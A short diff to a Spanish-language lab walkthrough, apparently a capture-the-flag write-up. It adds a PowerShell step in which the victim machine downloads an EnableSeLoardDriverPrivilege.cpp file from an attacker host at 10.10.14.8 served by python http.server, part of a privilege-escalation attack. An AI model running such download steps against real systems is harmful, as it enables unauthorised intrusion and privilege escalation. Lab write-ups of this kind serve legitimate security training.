@@ -389,7 +389,12 @@ Máquina atacante:
 ```bash
 python -m http.server 7777
 ```
-Desde la máquina víctima abrimos una powershell sin elevar
+Desde la máquina víctima abrimos una powershell sin elevar:
+
+```powershell
+wget "http://10.10.14.8:7777/EnableSeLoardDriverPrivilege.cpp" -outfile "EnableSeLoardDriverPrivilege.cpp`"
+```
+
 
 
 
